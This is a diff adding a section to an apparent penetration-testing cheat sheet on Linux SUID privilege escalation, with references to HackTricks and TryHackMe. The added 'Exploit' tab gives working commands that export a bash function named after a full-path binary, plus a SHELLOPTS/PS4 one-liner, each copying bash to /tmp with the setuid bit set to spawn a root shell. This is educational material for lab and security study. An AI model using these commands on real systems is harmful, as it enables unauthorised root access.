@@ -74,6 +74,45 @@ export PATH=/tmp:$PATH
 {% endtab %}
 {% endtabs %}
 
+
+### Functions Export Exploit - Full Path Binary
+
+{% tabs %}
+{% tab title="Enumerate" %}
+If the **suid** binary executes another command specifying the full path, then, we can try to **export a function** named as the command that the suid file is calling.
+
+You may use `strings` to spot others binary/command calls, or do some reverse engineering on the **suid** binary.
+
+```bash
+strings ./the-suid-bin
+
+...
+/usr/sbin/service apache2 start
+...
+```
+{% endtab %}
+
+{% tab title="Exploit" %}
+we can try to **export a function** named as the command that the suid file is calling.
+
+For example, if a suid binary calls /usr/sbin/service apache2 start you have to try to create the function and export it: 
+```bash
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+```
+
+Then, execute the SUID binary.
+```bash
+./the-suid-bin
+```
+
+**An other method** is to type the following command:
+```bash
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c './the-suid-bin; set +x; /tmp/bash -p'
+```
+{% endtab %}
+{% endtabs %}
+
 ### Shared Library Hijacking
 
 {% tabs %}
@@ -144,3 +183,10 @@ that means that the library you have generated need to have a function called `a
 {% endhint %}
 {% endtab %}
 {% endtabs %}
+
+
+### References
+
+{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}
+
+{% embed url="https://tryhackme.com/room/linuxprivescarena" %}
